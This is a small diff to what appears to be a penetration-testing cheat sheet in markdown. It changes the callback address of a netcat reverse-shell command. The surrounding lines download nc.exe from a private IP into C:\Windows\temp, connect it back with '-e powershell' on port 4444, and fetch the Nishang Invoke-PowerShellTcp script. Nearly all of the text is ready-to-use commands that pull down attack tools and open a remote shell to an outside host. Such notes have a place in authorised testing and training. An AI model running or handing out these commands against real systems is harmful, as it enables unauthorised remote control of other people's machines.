@@ -376,7 +376,7 @@ reset
 ```powershell
 #nc.exe
 powershell -nop -c "iwr -Uri http://192.168.45.218/nc.exe -Outfile C:\Windows\temp\nc.exe"
-C:\Windows\temp\nc.exe 10.10.14.35 4444 -e powershell
+C:\Windows\temp\nc.exe 192.168.45.218 4444 -e powershell
 
 # Invoke-PowerShellTcp
 wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
